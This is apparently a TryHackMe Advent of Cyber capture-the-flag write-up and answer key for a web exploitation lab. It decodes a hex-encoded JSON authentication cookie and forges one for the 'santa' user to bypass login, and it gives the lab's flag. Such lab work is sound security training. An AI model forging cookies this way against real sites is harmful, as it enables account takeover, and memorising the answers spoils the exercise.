# TRYHACKME: ADVENTOFCYBER2 - [DAY 1] WEB EXPLOITATION - A Christmas Crisis

```
"The Best Festival Company's brand new OpenVPN server has been hacked. This is a crisis!

The attacker has damaged various aspects of the company infrastructure -- including using the Christmas Control Centre to shut off the assembly line!

It's only 24 days until Christmas, and that line has to be operational or there won't be any presents! You have to hack your way  back into Santa's account (blast that hacker changing the password!) and getting the assembly line up and running again, or Christmas will be ruined!"

*After giving you the assignment, McSkidy hands you the following dossier of important information for the task. Before reading it, you press the big green "Deploy" button to start the Control Centre, as well as the "Start AttackBox" button at the top of the page *
```

TOPICS: The Web, HTTP(S), Cookies

### QUESTIONS

What is the name of the cookie used for authentication?

```
auth
```

In what format is the value of this cookie encoded?

```
7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a22343066756e626f626269227d

hexadecimal
```

Having decoded the cookie, what format is the data stored in?

```
{"company":"The Best Festival Company", "username":"40funbobbi"}

json
```

Figure out how to bypass the authentication.  What is the value of Santa's cookie?

```
{"company":"The Best Festival Company", "username":"santa"}

7B22636F6D70616E79223A22546865204265737420466573746976616C20436F6D70616E79222C2022757365726E616D65223A2273616E7461227D
```

Now that you are the santa user, you can re-activate the assembly line!  What is the flag you're given when the line is fully active?

```
THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}
```
